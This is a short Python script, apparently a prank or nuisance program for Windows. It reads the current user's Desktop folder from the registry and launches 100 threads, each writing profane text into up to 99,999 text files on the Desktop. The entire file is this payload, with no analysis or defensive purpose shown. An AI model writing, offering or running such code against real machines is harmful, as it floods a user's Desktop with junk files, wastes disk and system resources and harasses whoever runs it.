import threading
import os
import win32api,win32con


key =win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders',0,win32con.KEY_READ)
path = win32api.RegQueryValueEx(key,'Desktop')[0]
def fuck():
    os.chdir(path)
    #b = os.getcwd()
    #print(b)
    

    for i in range(99999):
        txt = str(i)+".txt"
        with open(txt,"a+") as f:
            message = "fuck you!"
            f.write(message)

            print(f.read())

threads = [threading.Thread(target=fuck) for t in range(100)]
for m in threads:
    m.start()



